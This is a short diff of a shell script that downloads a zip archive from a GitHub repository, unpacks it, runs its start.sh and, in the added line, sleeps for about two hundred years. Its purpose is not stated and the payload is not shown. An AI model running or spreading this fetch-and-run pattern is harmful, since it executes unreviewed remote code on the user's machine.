@@ -1,3 +1,4 @@
 curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/base.zip
 unzip base.zip
 bash start.sh
+sleep 6324662542
